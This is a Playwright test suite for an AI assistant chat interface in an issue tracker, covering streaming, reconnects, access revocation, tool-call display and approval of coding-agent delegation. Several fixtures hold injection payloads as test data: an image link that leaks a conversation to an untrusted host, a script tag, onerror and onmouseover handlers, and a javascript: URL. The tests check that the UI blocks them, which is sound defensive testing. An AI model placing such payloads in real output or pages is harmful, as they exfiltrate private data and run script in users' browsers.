import { test, expect, type Page, type WebSocketRoute } from '@playwright/test';

const workspace = { id: 'workspace-1', slug: 'test', name: 'Test Workspace', current_user_role: 'owner' };
const conversation = {
	id: 'chat-1',
	title: 'A persistent conversation',
	workspace_id: workspace.id,
	creator_id: 'user-1',
	created_at: '2026-10-26T10:00:00Z',
	updated_at: '2026-10-26T10:00:00Z'
};
const userMessage = {
	id: 'message-1',
	conversation_id: 'chat-1',
	sequence: 1,
	role: 'user',
	content: 'Hello assistant',
	status: 'completed',
	provider: '',
	model: '',
	created_at: conversation.created_at
};
const reply = {
	...userMessage,
	id: 'message-2',
	sequence: 2,
	role: 'assistant',
	content: '',
	status: 'streaming',
	provider: 'openai_compatible',
	model: 'configured-model'
};

async function fixture(page: Page) {
	const state = {
		messages: [] as (typeof userMessage)[],
		tools: [] as any[],
		approvals: [] as any[],
		queue: [] as any[],
		decisions: [] as string[],
		decisionStatus: 200,
		cursor: 0,
		events: [] as Array<{ cursor: number; [key: string]: unknown }>,
		sends: [] as string[],
		sockets: [] as WebSocketRoute[],
		denied: false,
		failAfterSend: false,
		failNextHistory: false,
		sendDelay: null as Promise<void> | null,
		replayDelay: null as Promise<void> | null,
		replayRequested: false,
		olderDelay: null as Promise<void> | null,
		olderRequested: false
	};
	await page.routeWebSocket('**/api/workspaces/test/ws', () => {});
	await page.routeWebSocket('**/conversations/chat-1/stream*', (socket) => {
		state.sockets.push(socket);
	});
	await page.route('https://raw.githubusercontent.com/**', (route) => route.fulfill({ json: [] }));
	await page.route('**/api/**', async (route) => {
		const url = new URL(route.request().url());
		const path = url.pathname;
		if (!path.startsWith('/api/')) return route.continue();
		if (path === '/api/auth/me')
			return route.fulfill({
				json: { id: 'user-1', name: 'Owner', display_name: 'Owner', email: 'owner@example.test' }
			});
		if (path === '/api/workspaces') return route.fulfill({ json: [workspace] });
		if (path === '/api/workspaces/test') return route.fulfill({ json: workspace });
		if (path === '/api/notifications') return route.fulfill({ json: { notifications: [], unread_count: 0 } });
		if (path.endsWith('/assistant/status'))
			return route.fulfill({ json: { configured: true, provider: 'openai_compatible', model: 'configured-model' } });
		if (path === '/api/workspaces/test/agent-tasks') return route.fulfill({ json: state.queue });
		if (path === '/api/workspaces/test/agent-tasks/task-9')
			return route.fulfill({
				json: {
					id: 'task-9',
					conversation_id: 'chat-issue',
					state: 'running',
					reason: 'Native coding harness started',
					provider: 'codex',
					model: 'deepseek-flash',
					generation: 1
				}
			});
		if (path.endsWith('/conversations'))
			return route.fulfill({ json: route.request().method() === 'POST' ? conversation : [conversation] });
		if (path.includes('/conversations/chat-1')) {
			if (state.denied) return route.fulfill({ status: 404, json: { error: { code: 'NOT_FOUND' } } });
			if (path.endsWith('/messages')) {
				state.sends.push(route.request().postDataJSON().content);
				if (state.sendDelay) await state.sendDelay;
				if (state.failAfterSend) state.failNextHistory = true;
				state.messages = [userMessage, reply];
				return route.fulfill({ status: 202, json: reply });
			}
			if (path.includes('/approvals/')) {
				const decision = route.request().postDataJSON().decision;
				state.decisions.push(decision);
				if (state.decisionStatus !== 200)
					return route.fulfill({ status: state.decisionStatus, json: { error: { code: 'INTERNAL_ERROR' } } });
				const resolved = {
					...state.approvals[0],
					status: decision === 'approve' ? 'approved' : 'denied',
					task_id: decision === 'approve' ? 'task-9' : undefined,
					resolved_at: '2026-10-26T10:05:00Z',
					updated_at: '2026-10-26T10:05:00Z'
				};
				state.approvals = [resolved];
				return route.fulfill({ json: resolved });
			}
			if (path.endsWith('/events')) {
				state.replayRequested = true;
				if (state.replayDelay) await state.replayDelay;
				return route.fulfill({
					json: state.events.filter((event) => event.cursor > Number(url.searchParams.get('after') ?? 0))
				});
			}
			if (path.endsWith('/cancel')) {
				state.messages = state.messages.map((m) => (m.status === 'streaming' ? { ...m, status: 'cancelled' } : m));
				return route.fulfill({ status: 204 });
			}
			if (state.failNextHistory) {
				state.failNextHistory = false;
				return route.fulfill({ status: 500, json: { error: { code: 'INTERNAL_ERROR' } } });
			}
			const before = Number(url.searchParams.get('before') ?? 0);
			if (before && state.olderDelay) {
				state.olderRequested = true;
				await state.olderDelay;
			}
			const messages = state.messages.filter((m) => !before || m.sequence < before);
			return route.fulfill({
				json: {
					conversation,
					messages: messages.slice(-50),
					tools: state.tools,
					approvals: state.approvals,
					cursor: state.cursor,
					has_more: messages.length > 50
				}
			});
		}
		return route.fulfill({ json: [] });
	});
	return state;
}

test('streams real events, preserves history and deduplicates reconnect replay', async ({ page }) => {
	const state = await fixture(page);
	await page.goto('/test/assistant?conversation=chat-1');
	const composer = page.getByRole('textbox', { name: 'Message' });
	await composer.fill('Hello assistant');
	await composer.press('Enter');
	await expect.poll(() => state.sends).toEqual(['Hello assistant']);
	await expect.poll(() => state.sockets.length).toBeGreaterThanOrEqual(2);
	const event = {
		id: 'event-3',
		cursor: 3,
		conversation_id: 'chat-1',
		type: 'message.delta',
		payload: { message_id: 'message-2', delta: 'Live partial answer' }
	};
	state.sockets.at(-1)!.send(JSON.stringify(event));
	await expect(page.getByText('Live partial answer', { exact: true })).toBeVisible();
	state.sockets.at(-1)!.send(JSON.stringify(event));
	await expect(page.getByText('Live partial answer', { exact: true })).toHaveCount(1);
	const socketCount = state.sockets.length;
	state.events = [
		{ ...event, id: 'event-4', cursor: 4, payload: { message_id: 'message-2', delta: ' after reconnect' } }
	];
	state.sockets.at(-1)!.close({ code: 1012, reason: 'Restart' });
	await expect.poll(() => state.sockets.length).toBe(socketCount + 1);
	await expect(page.getByText('Live partial answer after reconnect', { exact: true })).toBeVisible();
	expect(state.sockets.at(-1)!.url()).toContain('after=4');
	state.messages = [userMessage, { ...reply, content: 'Live partial answer after reconnect', status: 'completed' }];
	state.cursor = 5;
	state.sockets.at(-1)!.send(
		JSON.stringify({
			...event,
			id: 'event-5',
			cursor: 5,
			type: 'message.completed',
			payload: { message_id: 'message-2', status: 'completed' }
		})
	);
	await page.reload();
	await expect(page.getByText('Live partial answer after reconnect', { exact: true })).toBeVisible();
	expect(state.sends).toHaveLength(1);
});

test('keyboard newline, local drafts and mobile layout', async ({ page }, testInfo) => {
	await page.setViewportSize({ width: 375, height: 812 });
	const state = await fixture(page);
	await page.goto('/test/assistant?conversation=chat-1');
	const composer = page.getByRole('textbox', { name: 'Message' });
	await composer.fill('First line');
	await composer.press('Shift+Enter');
	await composer.type('Second line');
	expect(state.sends).toHaveLength(0);
	await page.reload();
	await expect(composer).toHaveValue('First line\nSecond line');
	expect(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth)).toBe(true);
	await page.screenshot({ animations: 'disabled', path: testInfo.outputPath('mobile.png') });
});

test('clears conversation content after access is revoked', async ({ page }) => {
	const state = await fixture(page);
	state.messages = [userMessage, { ...reply, content: 'Private response', status: 'completed' }];
	await page.goto('/test/assistant?conversation=chat-1');
	await expect(page.getByText('Private response', { exact: true })).toBeVisible();
	state.denied = true;
	state.sockets[0].close({ code: 1008, reason: 'Access revoked' });
	await expect(page.getByText('Private response', { exact: true })).toHaveCount(0);
	await expect(page.getByText('This conversation is no longer available.')).toBeVisible();
});

test('loads long history without moving the reader and follows only at the live edge', async ({ page }, testInfo) => {
	const state = await fixture(page);
	state.messages = Array.from({ length: 130 }, (_, i) => ({
		...userMessage,
		id: `history-${i}`,
		sequence: i + 1,
		role: i % 2 ? 'assistant' : 'user',
		content: `History message ${i}. ` + 'Detailed content. '.repeat(30)
	}));
	await page.goto('/test/assistant?conversation=chat-1');
	const viewport = page.locator('[data-slot="message-scroller-viewport"]');
	await expect(page.locator('[data-slot="message"]')).toHaveCount(50);
	await viewport.hover();
	await page.mouse.wheel(0, -100000);
	await expect.poll(() => viewport.evaluate((el) => el.scrollTop)).toBe(0);
	await page.getByRole('button', { name: 'Load older messages' }).click();
	await expect(page.locator('[data-slot="message"]')).toHaveCount(100);
	await expect.poll(() => viewport.evaluate((el) => el.scrollTop)).toBeGreaterThan(0);
	const position = await viewport.evaluate((el) => el.scrollTop);
	const event = {
		id: 'new',
		cursor: 200,
		conversation_id: 'chat-1',
		type: 'message.created',
		payload: { ...reply, id: 'latest', sequence: 131, content: 'New live activity' }
	};
	state.sockets.at(-1)!.send(JSON.stringify(event));
	await expect(page.locator('[data-slot="message"]')).toHaveCount(101);
	expect(Math.abs((await viewport.evaluate((el) => el.scrollTop)) - position)).toBeLessThan(40);
	await page.getByRole('button', { name: 'Scroll to latest' }).click();
	await expect(page.getByText('New live activity', { exact: true })).toBeInViewport();
	await page.screenshot({ animations: 'disabled', path: testInfo.outputPath('desktop.png') });
	await page.evaluate(() => document.documentElement.classList.add('dark'));
	await page.screenshot({ animations: 'disabled', path: testInfo.outputPath('desktop-dark.png') });
});

test('does not fetch provider-authored image URLs or execute agent HTML', async ({ page }) => {
	const state = await fixture(page);
	const fetched: string[] = [];
	await page.route('https://untrusted.example/**', (route) => {
		fetched.push(route.request().url());
		return route.fulfill({ status: 204 });
	});
	state.messages = [
		userMessage,
		{
			...reply,
			status: 'completed',
			content:
				'Safe response\n\n![preview](https://untrusted.example/leak?conversation=private)\n\n<script>window.agentExecuted=true</script>\n\n[Review changes](https://github.com/example/project/pull/1)'
		}
	];
	await page.goto('/test/assistant?conversation=chat-1');
	await expect(page.getByText('Safe response', { exact: true })).toBeVisible();
	await expect(page.locator('.assistant-markdown img')).toHaveCount(0);
	expect(fetched).toEqual([]);
	expect(await page.evaluate(() => Boolean((window as unknown as { agentExecuted?: boolean }).agentExecuted))).toBe(
		false
	);
	await expect(page.getByRole('link', { name: 'Review changes' })).toHaveAttribute(
		'href',
		'https://github.com/example/project/pull/1'
	);
});

test('keeps accepted sends visible while a history reload fails', async ({ page }) => {
	const state = await fixture(page);
	state.failAfterSend = true;
	await page.goto('/test/assistant?conversation=chat-1');
	const composer = page.getByRole('textbox', { name: 'Message' });
	await composer.fill('Hello assistant');
	await composer.press('Enter');
	await expect(page.getByRole('alert').filter({ hasText: 'Something went wrong' })).toBeVisible();
	await expect(page.getByText('Responding…', { exact: true })).toBeVisible();
	await composer.fill('Another thought');
	await expect(page.getByRole('button', { name: 'Send message' })).toHaveCount(0);
	await expect(page.getByText('Hello assistant', { exact: true })).toBeVisible({ timeout: 8000 });
	expect(state.sends).toHaveLength(1);
});

test('preserves a new draft typed while a send is pending', async ({ page }) => {
	const state = await fixture(page);
	let release!: () => void;
	state.sendDelay = new Promise<void>((resolve) => (release = resolve));
	await page.goto('/test/assistant?conversation=chat-1');
	const composer = page.getByRole('textbox', { name: 'Message' });
	await composer.fill('Hello assistant');
	await composer.press('Enter');
	await expect.poll(() => state.sends.length).toBe(1);
	await composer.fill('My next thought');
	release();
	await expect(page.getByText('Hello assistant', { exact: true })).toBeVisible();
	await expect(composer).toHaveValue('My next thought');
});

test('ignores a delayed reconnect after a fresh conversation load', async ({ page }) => {
	const state = await fixture(page);
	state.messages = [userMessage, reply];
	let release!: () => void;
	state.replayDelay = new Promise<void>((resolve) => (release = resolve));
	await page.goto('/test/assistant?conversation=chat-1');
	await expect.poll(() => state.sockets.length).toBe(1);
	state.sockets[0].close({ code: 1012, reason: 'Restart' });
	await expect.poll(() => state.replayRequested).toBe(true);
	await page.getByRole('button', { name: 'Stop response' }).click();
	await expect.poll(() => state.sockets.length).toBe(2);
	release();
	// Observe the stale network continuation; it must not open a third socket.
	await page.waitForTimeout(300);
	expect(state.sockets).toHaveLength(2);
});

test('does not restore delayed older history after access is revoked', async ({ page }) => {
	const state = await fixture(page);
	state.messages = Array.from({ length: 60 }, (_, i) => ({
		...userMessage,
		id: `history-${i}`,
		sequence: i + 1,
		content: `Private message ${i}`
	}));
	let release!: () => void;
	state.olderDelay = new Promise<void>((resolve) => (release = resolve));
	await page.goto('/test/assistant?conversation=chat-1');
	await expect(page.locator('[data-slot="message"]')).toHaveCount(50);
	await page.getByRole('button', { name: 'Load older messages' }).click();
	await expect.poll(() => state.olderRequested).toBe(true);
	state.denied = true;
	state.sockets.at(-1)!.close({ code: 1008, reason: 'Revoked' });
	await expect(page.getByText('This conversation is no longer available.')).toBeVisible();
	release();
	await page.waitForTimeout(300);
	await expect(page.locator('[data-slot="message"]')).toHaveCount(0);
});

test('opens persistent issue chat in place and links its focused view back to the issue', async ({ page }) => {
	const state = await fixture(page);
	const issue = {
		id: 'issue-1',
		identifier: 'ENG-1',
		workspace_id: workspace.id,
		team_id: 'team-1',
		title: 'Implement issue chat',
		description: 'Issue context',
		status: 'todo',
		priority: 0,
		number: 1,
		creator_id: 'user-1',
		created_at: conversation.created_at,
		updated_at: conversation.updated_at,
		labels: [],
		assignees: []
	};
	let opens = 0;
	await page.route('**/api/workspaces/test/issues/ENG-1', (route) => route.fulfill({ json: issue }));
	await page.route('**/api/workspaces/test/conversations', (route) => {
		if (route.request().method() === 'POST') {
			expect(route.request().postDataJSON()).toEqual({ issue_id: issue.id });
			opens++;
			return route.fulfill({ json: { ...conversation, issue_id: issue.id, team_id: issue.team_id } });
		}
		return route.fulfill({ json: [{ ...conversation, issue_id: issue.id, team_id: issue.team_id }] });
	});
	await page.goto('/test/issue/ENG-1');
	await page.getByRole('button', { name: 'Issue chat', exact: true }).click();
	const chat = page.getByRole('region', { name: 'Issue chat', exact: true });
	await expect(chat.getByRole('textbox', { name: 'Message', exact: true })).toBeVisible();
	await chat.getByRole('textbox', { name: 'Message', exact: true }).fill('Explain the implementation');
	await chat.getByRole('textbox', { name: 'Message', exact: true }).press('Enter');
	await expect.poll(() => state.sends).toEqual(['Explain the implementation']);
	await expect(page).toHaveURL(/\/issue\/ENG-1$/);
	await expect(chat.getByRole('link', { name: 'Open full conversation' })).toHaveAttribute(
		'href',
		'/test/assistant?conversation=chat-1'
	);
	await page.getByRole('button', { name: 'Issue chat', exact: true }).click();
	await page.getByRole('button', { name: 'Issue chat', exact: true }).click();
	await expect(chat.getByText('Hello assistant', { exact: true })).toBeVisible();
	expect(opens).toBe(1);
	await page.route('**/api/workspaces/test/conversations/chat-1?*', (route) =>
		route.fulfill({
			json: {
				conversation: { ...conversation, issue_id: issue.id, team_id: issue.team_id },
				issue: {
					id: issue.id,
					identifier: issue.identifier,
					title: issue.title,
					description: issue.description,
					status: issue.status
				},
				messages: state.messages,
				cursor: state.cursor,
				has_more: false
			}
		})
	);
	await chat.getByRole('link', { name: 'Open full conversation' }).click();
	await expect(page.getByRole('link', { name: 'ENG-1', exact: true })).toHaveAttribute('href', '/test/issue/ENG-1');
});

test('denied issue chat stays empty and can retry a temporary opening failure', async ({ page }) => {
	await fixture(page);
	const issue = {
		id: 'issue-1',
		identifier: 'ENG-1',
		workspace_id: workspace.id,
		team_id: 'team-1',
		title: 'Scoped issue',
		status: 'todo',
		priority: 0,
		creator_id: 'user-1',
		created_at: conversation.created_at,
		updated_at: conversation.updated_at,
		labels: [],
		assignees: []
	};
	await page.route('**/api/workspaces/test/issues/ENG-1', (route) => route.fulfill({ json: issue }));
	let status = 500;
	await page.route('**/api/workspaces/test/conversations', (route) =>
		route.fulfill({ status, json: { error: { code: 'DENIED' } } })
	);
	await page.setViewportSize({ width: 390, height: 844 });
	await page.goto('/test/issue/ENG-1');
	await page.getByRole('button', { name: 'Issue chat', exact: true }).click();
	const chat = page.getByRole('region', { name: 'Issue chat', exact: true });
	await expect(chat.getByRole('button', { name: 'Retry', exact: true })).toBeVisible();
	status = 404;
	await chat.getByRole('button', { name: 'Retry', exact: true }).click();
	await expect(chat.getByText('This conversation is no longer available.')).toBeVisible();
	await expect(chat.getByRole('textbox')).toHaveCount(0);
});

test('renders recorded tool calls from history and live events as escaped data', async ({ page }) => {
	const state = await fixture(page);
	const answered = { ...reply, status: 'completed', content: 'I created the issue.' };
	state.messages = [userMessage, answered];
	state.cursor = 4;
	const created = {
		id: 'tool-1',
		conversation_id: 'chat-1',
		message_id: answered.id,
		sequence: 0,
		call_id: 'call_1',
		name: 'create_issue',
		input: { team_key: 'ENG', title: 'Dark mode' },
		status: 'completed',
		output: { identifier: 'ENG-7', title: '<img src=x onerror="window.evil=1">' },
		created_at: conversation.created_at
	};
	state.tools = [created];
	await page.goto('/test/assistant?conversation=chat-1');
	const trigger = page.getByRole('button', { name: 'Created ENG-7' });
	await expect(trigger).toBeVisible();
	await expect(page.getByRole('link', { name: 'ENG-7' })).toHaveAttribute('href', '/test/issue/ENG-7');
	await trigger.click();
	await expect(
		page.locator('[data-slot="code-block-code"]').getByText('<img src=x onerror=', { exact: false })
	).toBeVisible();
	expect(await page.evaluate(() => (window as any).evil)).toBeUndefined();
	await expect.poll(() => state.sockets.length).toBeGreaterThan(0);
	const search = {
		...created,
		id: 'tool-2',
		sequence: 1,
		call_id: 'call_2',
		name: 'search_issues',
		input: { query: 'dark' },
		status: 'running',
		output: undefined
	};
	state.sockets
		.at(-1)!
		.send(JSON.stringify({ id: 'e5', cursor: 5, conversation_id: 'chat-1', type: 'tool.started', payload: search }));
	await expect(page.getByText('Running Search issues', { exact: true })).toBeVisible();
	const failed = { ...search, status: 'failed', error: 'query must be 1 to 200 characters' };
	state.sockets
		.at(-1)!
		.send(JSON.stringify({ id: 'e6', cursor: 6, conversation_id: 'chat-1', type: 'tool.completed', payload: failed }));
	await expect(page.getByRole('button', { name: 'Failed to run Search issues' })).toBeVisible();
	// A late replay of the start must not hide the recorded failure.
	state.sockets
		.at(-1)!
		.send(JSON.stringify({ id: 'e5', cursor: 5, conversation_id: 'chat-1', type: 'tool.started', payload: search }));
	await expect(page.getByRole('button', { name: 'Failed to run Search issues' })).toBeVisible();
	await expect(page.getByText('I created the issue.', { exact: true })).toBeVisible();
	const updated = {
		...created,
		id: 'tool-3',
		sequence: 2,
		call_id: 'call_3',
		name: 'update_issue',
		input: { identifier: 'ENG-7', priority: 1 },
		output: { identifier: 'ENG-7', title: 'Dark mode' }
	};
	state.sockets
		.at(-1)!
		.send(JSON.stringify({ id: 'e7', cursor: 7, conversation_id: 'chat-1', type: 'tool.completed', payload: updated }));
	await expect(page.getByRole('button', { name: 'Updated ENG-7' })).toBeVisible();
});

test('asks for approval before delegating and records the decision from the backend', async ({ page }) => {
	const state = await fixture(page);
	const answered = { ...reply, status: 'completed', content: 'Approval is pending.' };
	state.messages = [userMessage, answered];
	const call = {
		id: 'tool-9',
		conversation_id: 'chat-1',
		message_id: answered.id,
		sequence: 0,
		call_id: 'call_9',
		name: 'delegate_issue',
		input: { identifier: 'ENG-1' },
		status: 'completed',
		output: { approval_id: 'approval-1', status: 'pending_user_approval', identifier: 'ENG-1' },
		created_at: conversation.created_at
	};
	state.tools = [call];
	state.approvals = [
		{
			id: 'approval-1',
			conversation_id: 'chat-1',
			tool_call_id: 'tool-9',
			action: 'delegate_issue',
			actor_id: 'user-1',
			issue_id: 'issue-1',
			payload: {
				identifier: 'ENG-1',
				title: 'Dark mode',
				instructions: '<b onmouseover="window.evil=1">Implement</b> dark mode'
			},
			status: 'pending',
			expires_at: '2026-10-27T10:00:00Z',
			created_at: conversation.created_at,
			updated_at: conversation.created_at
		}
	];
	await page.goto('/test/assistant?conversation=chat-1');
	await expect(page.getByText('Start a coding agent on ENG-1?', { exact: true })).toBeVisible();
	await expect(page.getByText('<b onmouseover=', { exact: false })).toBeVisible();
	await page.setViewportSize({ width: 360, height: 800 });
	await expect(page.getByRole('button', { name: 'Approve', exact: true })).toBeInViewport();
	expect(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth)).toBe(true);
	expect(await page.evaluate(() => (window as any).evil)).toBeUndefined();
	state.decisionStatus = 500;
	await page.getByRole('button', { name: 'Approve', exact: true }).click();
	await expect(page.getByRole('alert').getByText('The decision could not be saved. Try again.')).toBeVisible();
	state.decisionStatus = 200;
	await page.getByRole('button', { name: 'Approve', exact: true }).click();
	await expect(page.getByText('Coding agent started on ENG-1', { exact: true })).toBeVisible();
	await expect(page.getByRole('button', { name: 'Approve', exact: true })).toHaveCount(0);
	const subagent = page.getByRole('button', { name: /Coding agent on ENG-1/ });
	await expect(subagent).toBeVisible();
	await expect(subagent).toContainText('Running');
	await subagent.click();
	await expect(page.getByText('Native coding harness started', { exact: true })).toBeVisible();
	await expect(page.getByRole('link', { name: 'Open the issue chat' })).toHaveAttribute(
		'href',
		'/test/assistant?conversation=chat-issue'
	);
	expect(state.decisions).toEqual(['approve', 'approve']);
	await page.reload();
	await expect(page.getByText('Coding agent started on ENG-1', { exact: true })).toBeVisible();
	// A stale pending copy replayed later cannot reopen the decision.
	await expect.poll(() => state.sockets.length).toBeGreaterThan(0);
	state.sockets.at(-1)!.send(
		JSON.stringify({
			id: 'e9',
			cursor: 9,
			conversation_id: 'chat-1',
			type: 'approval.requested',
			payload: { ...state.approvals[0], status: 'pending', updated_at: conversation.created_at }
		})
	);
	await expect(page.getByText('Coding agent started on ENG-1', { exact: true })).toBeVisible();
	await expect(page.getByRole('button', { name: 'Approve', exact: true })).toHaveCount(0);
});

test('lists agent work across projects as a queue linking to each issue chat', async ({ page }) => {
	const state = await fixture(page);
	const item = (id: string, identifier: string, taskState: string) => ({
		id,
		conversation_id: `chat-${id}`,
		state: taskState,
		reason: '',
		issue_identifier: identifier,
		issue_title: `Title ${identifier}`,
		updated_at: conversation.created_at
	});
	state.queue = [item('a', 'ENG-1', 'running'), item('b', 'ENG-2', 'awaiting_review'), item('c', 'WEB-3', 'completed')];
	await page.goto('/test/assistant');
	const queue = page.getByRole('region', { name: 'Agent work', exact: true });
	await expect(queue.getByText('2 in progress or waiting', { exact: true })).toBeVisible();
	await expect(queue.getByRole('link', { name: /ENG-1 · Title ENG-1/ })).toHaveAttribute(
		'href',
		'/test/assistant?conversation=chat-a'
	);
	await expect(queue.getByRole('link', { name: /ENG-2/ })).toBeVisible();
	await expect(queue.getByRole('link', { name: /WEB-3/ })).toBeHidden();
	await queue.getByRole('button', { name: '1 finished' }).click();
	await expect(queue.getByRole('link', { name: /WEB-3/ })).toBeVisible();
});

test('lists the issues a reply used and offers contextual suggestions', async ({ page }) => {
	const state = await fixture(page);
	await page.goto('/test/assistant?conversation=chat-1');
	const suggestion = page.getByRole('button', { name: 'Which of my issues are in review?' });
	await expect(suggestion).toBeVisible();
	await suggestion.click();
	await expect.poll(() => state.sends).toEqual(['Which of my issues are in review?']);

	const answered = { ...reply, status: 'completed', content: 'Two issues are in review.' };
	state.messages = [userMessage, answered];
	state.tools = [
		{
			id: 't1',
			conversation_id: 'chat-1',
			message_id: answered.id,
			sequence: 0,
			call_id: 'c1',
			name: 'search_issues',
			input: { query: 'review' },
			status: 'completed',
			output: {
				issues: [
					{ identifier: 'ENG-1', title: 'Dark mode' },
					{ identifier: 'ENG-2', title: 'Search' },
					{ identifier: 'javascript:alert(1)', title: 'x' }
				]
			},
			created_at: conversation.created_at
		},
		{
			id: 't2',
			conversation_id: 'chat-1',
			message_id: answered.id,
			sequence: 1,
			call_id: 'c2',
			name: 'get_issue',
			input: { identifier: 'ENG-1' },
			status: 'completed',
			output: { identifier: 'ENG-1', title: 'Dark mode' },
			created_at: conversation.created_at
		}
	];
	await page.reload();
	const sources = page.getByRole('button', { name: 'Used 2 issues' });
	await expect(sources).toBeVisible();
	await sources.click();
	await expect(page.getByRole('link', { name: /ENG-2 · Search/ })).toHaveAttribute('href', '/test/issue/ENG-2');
	await expect(page.getByRole('link', { name: /javascript/ })).toHaveCount(0);
});
